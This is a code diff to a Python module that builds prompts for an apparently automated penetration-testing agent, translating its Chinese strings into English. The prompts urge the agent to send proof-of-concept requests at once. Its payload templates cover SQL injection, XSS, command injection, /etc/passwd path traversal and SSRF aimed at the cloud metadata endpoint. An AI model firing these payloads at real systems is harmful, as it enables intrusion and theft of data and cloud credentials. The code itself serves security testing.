@@ -216,56 +216,56 @@ def extract_user_vuln_hint(user_input: str) -> str:
     vuln_str = "/".join(found_vulns[:3])
     if target:
         return (
-            f"【用户明确提示 — 第1轮】\n"
-            f"用户明确告诉你 【{target}】 存在 【{vuln_str}】 漏洞。\n"
+            f"[Explicit user hint — Round 1]\n"
+            f"The user explicitly told you that [{target}] has a [{vuln_str}] vulnerability.\n"
             f"\n"
-            f"→ 你必须立即构造并发送 PoC 测试请求！\n"
-            f"→ 用 fetch 工具直接发送请求，观察真实响应！\n"
-            f"→ 不要先探索路径、不要先做信息收集，直接测漏洞！\n"
+            f"→ You must immediately construct and send a PoC test request!\n"
+            f"→ Use the fetch tool to send the request directly and observe the real response!\n"
+            f"→ Do not explore paths or do recon first — test the vulnerability directly!\n"
             f"\n"
             f"{get_payload_examples(found_vulns, target)}"
         )
     return (
-        f"【用户明确提示】\n"
-        f"用户要求你测试 【{vuln_str}】 漏洞。\n"
-        f"→ 立即基于已发现的目标信息构造 PoC 测试，不要先做额外信息收集！"
+        f"[Explicit user hint]\n"
+        f"The user asked you to test a [{vuln_str}] vulnerability.\n"
+        f"→ Immediately construct a PoC test from the already-discovered target info; do not do extra recon first!"
     )
 
 
 def get_payload_examples(found_vulns: list[str], target: str) -> str:
     """Return concrete PoC payload examples for the given vulnerability types."""
-    lines = ["【PoC payload 示例】"]
+    lines = ["[PoC payload examples]"]
     for vuln in found_vulns[:2]:
         if "SQL" in vuln:
             lines += [
-                "SQL注入测试（布尔盲注）:",
-                f"  GET {target}?id=1' AND 1=1--  → 观察响应长度",
-                f"  GET {target}?id=1' AND 1=2--  → 长度是否不同？",
-                "SQL注入测试（报错注入）:",
+                "SQL injection test (boolean blind):",
+                f"  GET {target}?id=1' AND 1=1--  → observe the response length",
+                f"  GET {target}?id=1' AND 1=2--  → is the length different?",
+                "SQL injection test (error-based):",
                 f"  GET {target}?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
             ]
         elif "XSS" in vuln:
             lines += [
-                "XSS测试:",
-                f"  GET {target}?q=<script>alert(1)</script>  → 页面是否回显该内容",
+                "XSS test:",
+                f"  GET {target}?q=<script>alert(1)</script>  → does the page reflect this content?",
                 f"  GET {target}?q=<img src=x onerror=alert(1)>",
             ]
         elif "RCE" in vuln or "命令注入" in vuln:
             lines += [
-                "RCE/命令注入测试:",
-                f"  GET {target}?cmd=whoami  → 观察是否有命令输出",
-                f"  GET {target}?c=whoami  → 不同参数名都试",
+                "RCE / command-injection test:",
+                f"  GET {target}?cmd=whoami  → check for command output",
+                f"  GET {target}?c=whoami  → try different parameter names",
             ]
-        elif "文件包含" in vuln or "路径遍历" in vuln:
+        elif "文件包含" in vuln or "路径遍历" in vuln or "LFI" in vuln or "RFI" in vuln:
             lines += [
-                "文件包含/路径遍历测试:",
-                f"  GET {target}?f=/etc/passwd  → 读取系统文件",
+                "File-inclusion / path-traversal test:",
+                f"  GET {target}?f=/etc/passwd  → read a system file",
                 f"  GET {target}?f=../../../../etc/passwd",
             ]
         elif "SSRF" in vuln:
             lines += [
-                "SSRF测试:",
-                f"  GET {target}?url=http://127.0.0.1  → 是否有响应",
+                "SSRF test:",
+                f"  GET {target}?url=http://127.0.0.1  → any response?",
                 f"  GET {target}?url=http://169.254.169.254/latest/meta-data/",
             ]
     return "\n".join(lines[:12])
